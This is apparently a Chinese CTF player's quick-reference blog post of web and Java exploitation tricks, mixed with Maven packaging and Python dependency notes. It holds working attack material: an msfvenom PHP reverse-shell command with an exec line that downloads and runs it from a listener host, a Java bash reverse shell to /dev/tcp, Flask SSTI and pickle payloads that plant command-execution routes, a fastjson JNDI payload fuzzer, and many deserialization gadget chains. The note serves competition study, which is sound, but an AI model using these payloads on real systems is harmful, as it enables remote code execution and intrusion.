---
title: "CTF 快速查ban"
onlyTitle: true
date: 2024-8-2 17:10:57
categories:
- ctf
tags:
- CTF
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B895.jpg

---

## ctf平台

ctf复现：https://gz.imxbt.cn/account/login

## Common-Collections

CC链

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png)

## trick绕过

RCE绕过preg_match 

https://zhuanlan.zhihu.com/p/392606966

PHP特性绕过WAF函数，如get_defined_vars()

https://www.runoob.com/php/php-variable-handling-functions.html

无字母数字RCE：

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

反弹shell绕过

https://xz.aliyun.com/t/14240?u_atoken=587a65cb6338b3cc0d7fb5e0102746e4&u_asig=1a0c399817268327732403019e00a7

kali默认的是zsh[](https://so.csdn.net/so/search?q=zsh&spm=1001.2101.3001.7020) shell，所以如果想把kali的shell用bash反弹出去的话需要先用**bash命令进入bash shell**才能使用bash反弹shell

验证码爆破可以用burp+ddddocr

在可以exec执行任意代码时，可以msfvenom生成对应语言的反弹shell txt，并执行，如php：

```shell
msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 > /var/www/html/shell.txt
```

```php
exec('wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php');
```

ssti绕过

https://blog.csdn.net/m0_73185293/article/details/131695528

JAVA URLClassLoader过滤了http和file协议可以用jar协议绕过

审代码，看到有读文件，然后根据布尔值来读的，一定要想起竞争！遇到很多次了

sql fuzz（来自2025ciscn初赛）：https://www.cnblogs.com/perl6/p/6120045.html#3573210

有反序列化写文件链子，无法加载charsets.jar的情况（当然也能运行其他非黑名单code才行）：因为我们手上有附件，可以用`-verbose:class`本地运行jar包，看看加载了哪些jar

1、没有加载dnsns.jar，可以通过反序列化`sun.net.spi.nameservice.dns.DNSNameServiceDescriptor`触发`dnsns.jar`加载

2、没有加载jce.jar，可以通过重写jar中的javax.crypto.NoSuchPaddingException类来加载

路径可以去spring fatjar写charsets.jar文里用字典全部遍历一遍

redis持久化文件dump.rdp，有任意文件读+redis的时候考虑使用（2026软件赛初赛），字典也应该跑一遍（2025华为杯决赛）

codeql不构建的情况下生成数据库（就可以不编译了，提前jadx反编译出来：

```plain
codeql database create db-name --language=java --source-root=./sources --build-mode=none
```

有数据库构建：

```plain
codeql database create db_name --language="java" --command="mvn clean install --file pom.xml" --source-root=~/micro-service-seclab/
```





### 单参数exec绕过

一般用的是单参数exec

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240913125109102.png)

https://blog.csdn.net/whatday/article/details/107098353

这篇文章讲了java单参数exec反弹shell应该使用`Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");`



## fastjson

fastjson目标不出网，<=1.2.24下打BCEL，需要回显可以打内存马

目标出网 ，<=1.2.47，打JNDI

1.2.68+commons-io能写文件

github上有payload项目，我所知的唯一缺少的是fastjson>1.2.36+有h2依赖能打jdbc attack

在线java内存马MemShellParty生成https://party.mem.mk/ui



## Gadget

别人的导图，太叼了https://github.com/1diot9/MyJavaSecStudy/blob/main/%E5%88%A9%E7%94%A8%E9%93%BE%E5%AF%BC%E5%9B%BE

java-search-object从线程找变量

一个gadget衔接合集，仅统计常用衔接链

Hessian2反序列化和Kryo、FST反序列化会触发hashMap.put，hashCode/equals/compareTo

发现一个超全的hessian反序列化分析：https://1diot9.github.io/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/

compare通常伴随着任意getter调用（因为compare需要逐项取值对比）

CodeSigner.toString->List.get()(See lilctf 2025)

BadAttributeValueExpException.readObject -> toString

XString.equals -> toString

HashMap.readObject() -> AbstractMap.equals -> UIDefault$TextAndMnemonicHashMap.get -> toString

EventListenerList.readObject() -> tostring



UTF-8 Overlong Encodeing 绕过字符串正则型WAF

RMIConnector#connect ->findRMIServer ->findRMIServerJRMP 对base64String二次反序列化

(CC 3.2.1&&CC 4) TransformedList.set() -> transform

(JDK8u65) AnnotationInvocationHandler.invoke -> get

(jdk7u21/8u20 rce) AnnotationInvocationHandler.equalsImpl -> invoke 

PriorityQueue.readObject -> compare

(cb) PropertyUtils.getProperty -> getter

(jackson/springboot) POJONode.toString -> JSON.writeValueAsString ->getter

(jackson) ObjectMapper.readValue -> setter/constructor/getter

(jackson) JSONFactory.createParser -> setter/constructor



(fastjson) JSON.parse -> setter

(fastjson) JSON.parseObject -> setter/getter

(fastjson) JSONObject.toString -> getter (1.2.83都能打原生二次反序列化)

(Spring-AOP && aspectjweaver) 任意方法调用



signedObject.getObject -> readObject

JdbcRowSetImpl.setAutoCommit(is setter) ->  JNDI

JdbcRowSetImpl.getDatabaseMetaData(is getter) -> JNDI

LdapAttribute.getAttributeDefinition（is getter) -> JNDI

(resin) com.caucho.naming.QName#toString -> JNDI

(Tomcat) BasicDataSource.getConnection -> Class.forName



(hibernate v4) BasicPropertyAccessor$BasicGetter.get -> getter

(hibernate v5) GetterMethodImpl.get() -> getter

(hibernate 反序列化) ComponentType.getPropertyValue() -> get



(c3p0) ReferenceableUtils#ReferenceSerialized.referenceToObject -> Reference JNDI

(rome) ToStringBean.toString -> getter

(rome) EqualsBean.beanEquals -> getter

(rome) EqualsBean.hashCode -> toString

(spring) HashMap.put -> HotSwappableTargetSource.equals -> equals

HashMap、HashSet、HashTable 碰撞也能触发equals（见https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE) 

```
HashMap/HashSet/HashTable.readObject
HashMap.put
HashMap.putval
HashMap.equals
Abstractmap.equals
equals
```

UsingToStringOrdering.compare ->toString

(spring) ClassPathXmlApplicationContext.ClassPathXmlApplicationContext -> spEL注入

com.google.api.client.util.IOUtils.deserialize二次反序列化（见alictf 2026 Fileury）



### CC Gadget

CC Gadget提纯

TransformedMap.checkSetValue -> transform (CC1)

LazyMap.get -> transform (CC1)

TransformingComparator.compare -> transform (CC2)

TiedMapEntry.hashCode -> get (CC3)

TrAXFilter.TrAXFilter -> newTransformer (CC3)

TiedMapEntry.toString -> getValue -> get (CC5)

LazyMap.get->put



### JDBC Attack

打CPX的如果有Tomcat，都可以搭配ascii-jar写文件加载

(databricks) ->JNDI(alictf 2026MHGA)

(mysql)fakeserver->readObject原生反序列化

(PostgreSQL)socketFactory+socketFactoryArg->constructor（打CPX）

(PostgreSQL)loggerLevel+loggerFile->writeFile

(h2database)RUNSCRIPT->远程加载SQL 出网

(h2database)CREATE TRIGGER创建触发器->执行JavaScript/执行java代码/Groovy AST

(Jre17 +h2database)commons-io写文件+commons-beanutils MethodUtils反射调用System.load

(IBM DB2)->JNDI

(ModeShape)->JNDI

(Derby)JNDIServer->readObject原生反序列化

(sqlite)`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`上传任意文件->create view劫持select语句->load_extension加载动态链接库

(Tomcat)org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory JNDI->JDBC



### JNDI HignVersion

getObjectInstance大集合

(Hessian)HessianProxyFactory JNDI to Hessian反序列化

(Tomcat)beanFactory 构造一个恶意ResourceRef类，forceString参数调用任意方法

org.apache.catalina.users.MemoryUserDatabaseFactory JNDI to XXE

org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory JNDI to JDBC

(vibur)ViburDBCPObjectFactory->JDBC Attack




### jwt

一般jwt直接破解不了的，考虑原型链污染key。一般jwt考题都伴随了原型链污染

面试问了jwt相对session/cookie的优劣势：可以放在cookie外的header头，防止csrf



### hessian

hessian一般伴随着能触发hashMap.put hashCode/equals/compareTo

hessian打TemplatesImpl不能readObject初始化tfactory，可以选择直接SignedObject->TemplatesImpl

这个超全：

https://1diot9.github.io/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/

我曹，关注了1diot9，这链子图无敌了，直接偷

![JavaGadget](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JavaGadget.png)

这里可以用两种打法

* 打法1：hessian原生链

createValue反射调用任意static方法和构造函数，因为这里没有newInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321135711533.png)

HashMap.readObject -> AbstractMap.equals ->javax.swing.UIDefaults$TextAndMnemonicHashMap.get->getFromHashtable->SwingLazyValue(only jdk8)/javax.swing.UIDefaults$ProxyLazyValue.createValue->JavaUtils.writeBytesToFilename(FileWrite)/System.load

SwingLazyValue jdk8以上没了，所以jdk11用UIDefaults$ProxyLazyValue打，写dll+load加载或者CPX都可以，只要出网

另外反射调用MethodUtil#invoke可以扩大到任意方法，进而加载字节码或者Runtime





* 打法2：

另外Hessian反序列化除了触发put，还有hashCode/equals/compareTo

HashMap.readObject -> AbstractMap.equals ->javax.swing.UIDefaults$TextAndMnemonicHashMap.get -> toString

这里还有jackson，所以拼上结束

POJONode.toString -> JSON.writeValueAsString ->getter

>Lijnux有sun.print.UnixPrintService的printer可以携带参数，然后里面有好多getter都会execCmd该参数的内容，不过这个类只在windows下有，而且是私有+没继承Serializable接口，但是在不需要Serializable场景下调用getter（hessian)就会触发漏洞，因为是私有类所以fastjson/jackson/snakeYaml这种几乎不用考虑了
>
>https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/

signedObject当然也不错



### JRMP

我其实有个疑问是因为JEP290，高版本不是不能打JRMP了吗

>## 关于JRMP的两种攻击流程如下
>
>### 第一种攻击方式
>
>个人理解：基于RMI的反序列化中的客户端打服务端的类型
>
>我们需要先发送指定的payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的payload后会开启一个RMI的服务监听在设置的端口上。
>
>我们还需要在我们自己的服务器使用exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。
>
>简单来说就是将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该payload（JRMPListener）过后会在指定的端口开启RMI监听，然后再通过exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。二次反序列化这一块
>
>### 第二种攻击方式
>
>个人理解：基于RMI的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用
>
>将exploit（JRMPListener）作为攻击方进行监听。
>
>我们发送指定的payloads（JRMPClient）使得存在漏洞的服务器向我们的exploit（JRMPListener）进行连接，连接后exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。
>
>PS：这里的payload和exploit就是指的不同包下的JRMPListener和JRMPClient！
>
>Ref：https://www.cnblogs.com/zpchcbd/p/14934168.html
>
>而且这里开监听用的是yso exploit下的代码，另一端执行用的payloads下的代码。打JNDI的话直接输地址就行了，连Client都省了

所以第二种打法是无版本限制的

>另外，当个乐子看，在 exploit/JRMPListener 和 payloads/JRMPClient 的利用过程中，这个 server 端和 client  端，攻击者和受害者的角色是可以互换的，在你去打别人的过程中，很有可能被反手一下，所以最好的情况就是，只是发送数据，不去接受另一端传过来的信息，所以说用这个 exploit/JRMPClient 是不会自己打自己的

所以如果打JRMPLisenter，这里的poc是直接改ysoserial的这里，好像不用改源码也行？参数指定就行了

https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution/JRMPListener.java

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321153108038.png)

Client直接lookup

`initialContext.lookup("rmi://127.0.0.1:1399/any");`



这里其实来自alictf2026MHGA的非预期我才学到的，之前一直都没能理解



### 无回显问题

#### flask SSTI无回显

```http
{{a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell3%27,%20%27shell2%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27ls%20/%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
```

### pickle不出网无回显

```python
import base64
import pickle

class genpoc(object):
    def __reduce__(self):
        s = """import sys
sys.modules['__main__'].__dict__['app'].debug=False
sys.modules['__main__'].__dict__['app'].add_url_rule('/shell1','shell1',lambda :__import__('os').popen('ls /').read())"""  # 要执行的命令
        return exec, (s,)        # reduce函数必须返回元组或字符串

e = genpoc()
poc = pickle.dumps(e)
basepoc = base64.b64encode(poc)
print(basepoc)
```











## other骚报错解决

特别坑点：注意yakit发包 ，post的base64数据一定要URL编码呀！

### maven打包问题

经常遇到打包的问题，spring环境下会自动打包lib目录下的依赖，成为fatJAR形式

不是spring项目也能打包成fatJAR

* 生成fatJAR，而且是深度耦合，意思是会把依赖全部解压后放到jar中

```xml
            <!-- 使用 maven-assembly-plugin -->
<!--            打包所有依赖到jar,并且是文件夹级别的深耦合,生成jar-with-dependencies-->
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <version>3.6.0</version>
                <configuration>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                    <!-- 不指定 mainClass -->
                    <archive>
                        <manifest>
                            <addClasspath>true</addClasspath>
                        </manifest>
                    </archive>
                </configuration>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
```

如果不需要解压，想把源代码的lib目录下的依赖放到jar的lib目录下，而不解压，可用以下方式：

* 先把依赖全部复制到源代码lib目录，然后用assembly.xml打包

```xml
			<plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-dependency-plugin</artifactId>
                <version>3.5.0</version>
                <executions>
                    <execution>
                        <id>copy-dependencies</id>
                        <phase>package</phase>
                        <goals>
                            <goal>copy-dependencies</goal>
                        </goals>
                        <configuration>
                            <outputDirectory>${project.basedir}/lib</outputDirectory>
                            <includeScope>runtime</includeScope>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <version>3.6.0</version>
                <executions>
                    <execution>
                        <id>make-jar-with-lib</id>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                        <configuration>
                            <descriptors>
                                <descriptor>assembly.xml</descriptor>
                            </descriptors>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
```

assembly.xml：

```xml
<assembly xmlns="http://maven.apache.org/ASSEMBLY/2.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/ASSEMBLY/2.0.0
          http://maven.apache.org/xsd/assembly-2.0.0.xsd">
    <id>jar-with-lib</id>
    <formats>
        <format>jar</format>
    </formats>
    <includeBaseDirectory>false</includeBaseDirectory>
    <fileSets>
        <!-- 1. 包含 class 文件 -->
        <fileSet>
            <directory>${project.build.outputDirectory}</directory>
            <outputDirectory>/</outputDirectory>
        </fileSet>

        <!-- 2. 包含 lib 目录 -->
        <fileSet>
            <directory>${project.basedir}/lib</directory>
            <outputDirectory>/lib</outputDirectory>
        </fileSet>
    </fileSets>
</assembly>
```

### paython传参问题

request.form.get()是接收POST表单，且表单的Content-Type是application/x-www-form-urlencoded（好像还能接收一个），反正不能是application/json

POST数据需要url转义一下，比如role本来加密出来是`role="ax5K/oHZwZnVglrUvxHLK+qzifNPoCLMDMYZ6CaH1kY="`，传过去`+`因为URL编码变为空格，所以AES解密失败

### idea文件咖啡杯问题

idea java文件变成茶杯是没办法调试和find Usages的，需要把源代码目录标记为源代码根目录。比如分析Tomcat源码：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922205013696.png)



### jinja2安装问题

jinja2 报cannot import name ‘Markup‘ from ‘jinja2‘

1. 先卸载已经安装的jinja2:
   `pip uninstall jinja2`
2. 安装 2.11.3版本（目前已知该版本有‘Markup’模块）
   `pip install jinja2==2.11.3`
3. 然后报'soft_unicode' from 'markupsafe'

```shell
python -m pip install markupsafe==2.0.1
```

4. 报import name 'url_quote' from 'werkzeug.urls'

pip list找到flask版本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928145905945.png)

访问flask源码

https://github.com/pallets/flask

找到对应的tag，访问setup.py

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150112011.png)

尝试把werkzeug降到0.14

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150315423.png)

### fenjing安装问题

* jinja ssti 神器 fenjing安装：

```shell
  pipx install fenjing
  pipx run fenjing webui
```

python创建虚拟环境后（pycharm能创建虚拟venv），在 venv\Scripts\目录下使用activate进入虚拟环境命令行，pip下载虚拟环境依赖包。(注意pip时关掉代理，清华源屏蔽国外流量)



### nodejs原型链污染无效问题

nodejs原型链污染记得改Content-Type为application/json

nodejs有原型链污染，python也有



### proc ctf常用文件信息

进行内网探测时可以读取

```
/proc/net/arp
/etc/host
```

proc/进程号/cmline存储着启动当前程序的命令

```
/proc/2889/cmdline
```

cwd文件存储了当前进程环境的运行目录

```
/proc/1289/cwd
```

proc/self表示当前进程目录。等同于/proc/本进程id。所以获取当前进程命令也可以用

```
/proc/self/cmdline
```



### 静态代码块执行问题

众所周知，类加载分为以下几个部分：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020173306426.png)

可简单认为`加载连接->初始化->实例化->使用`

其中加载连接什么代码块都不会调用，初始化会调用静态代码块，实例化调用构造代码块和构造方法

* 调用静态方法会执行：静态代码块，静态方法
* 给静态属性赋值：静态代码块
* 调用构造方法：静态代码块，构造代码块，构造方法
* Person.class：什么都不会执行

动态加载调用总结如下

* 默认Class.forName：静态代码块
* Class.forName第二个参数传false：什么都不会执行（不初始化版）

* ClassLoader.loadClass：什么都不会执行！不进行初始化

* defineClass：什么都不做





一个fuzzing fastjson的脚本

```python
import json
from json import JSONDecodeError


class FastJsonPayload:
    def __init__(self, base_payload):
        try:
            json.loads(base_payload)
        except JSONDecodeError as ex:
            raise ex
        self.base_payload = base_payload

    def gen_common(self, payload, func):
        tmp_payload = json.loads(payload)
        dct_objs = [tmp_payload]

        while len(dct_objs) > 0:
            tmp_objs = []
            for dct_obj in dct_objs:
                for key in dct_obj:
                    if key == "@type":
                        dct_obj[key] = func(dct_obj[key])

                    if type(dct_obj[key]) == dict:
                        tmp_objs.append(dct_obj[key])
            dct_objs = tmp_objs
        return json.dumps(tmp_payload)

    # 对@type的value增加L开头，;结尾的payload
    def gen_payload1(self, payload: str):
        return self.gen_common(payload, lambda v: "L" + v + ";")

    # 对@type的value增加LL开头，;;结尾的payload
    def gen_payload2(self, payload: str):
        return self.gen_common(payload, lambda v: "LL" + v + ";;")

    # 对@type的value进行\u
    def gen_payload3(self, payload: str):
        return self.gen_common(payload,
                               lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    # 对@type的value进行\x
    def gen_payload4(self, payload: str):
        return self.gen_common(payload,
                               lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    # 生成cache绕过payload
    def gen_payload5(self, payload: str):
        cache_payload = {
            "rand1": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            }
        }
        cache_payload["rand2"] = json.loads(payload)
        return json.dumps(cache_payload)

    def gen(self):
        payloads = []

        payload1 = self.gen_payload1(self.base_payload)
        yield payload1

        payload2 = self.gen_payload2(self.base_payload)
        yield payload2

        payload3 = self.gen_payload3(self.base_payload)
        yield payload3

        payload4 = self.gen_payload4(self.base_payload)
        yield payload4

        payload5 = self.gen_payload5(self.base_payload)
        yield payload5

        payloads.append(payload1)
        payloads.append(payload2)
        payloads.append(payload5)

        for payload in payloads:
            yield self.gen_payload3(payload)
            yield self.gen_payload4(payload)


if __name__ == '__main__':
    fjp = FastJsonPayload('''{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}''')

    for payload in fjp.gen():
        print(payload)
        print()
```



